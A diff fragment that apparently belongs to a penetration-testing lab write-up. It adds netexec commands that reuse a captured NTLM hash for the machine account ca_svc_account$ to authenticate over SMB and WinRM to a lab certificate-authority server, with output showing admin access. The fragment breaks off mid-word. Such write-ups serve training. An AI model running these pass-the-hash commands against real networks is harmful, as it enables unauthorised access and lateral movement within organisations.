@@ -348,5 +348,17 @@ LDAP        10.10.10.136    389    DC               Account: ca_svc_account$    
 I now have the NTLM hash of the `ca_svc_account$`
 
 ```python
-
+nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'      
+SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
 ```
+This user is also an administrator on the CA server
+
+```python
+nxc winrm ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'
+WINRM       10.10.10.134    5985   CA               [*] Windows 11 / Server 2025 Build 26100 (name:CA) (domain:ext.darkhaven.local) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.10.134    5985   CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
+```
+This user also has access via ewinr
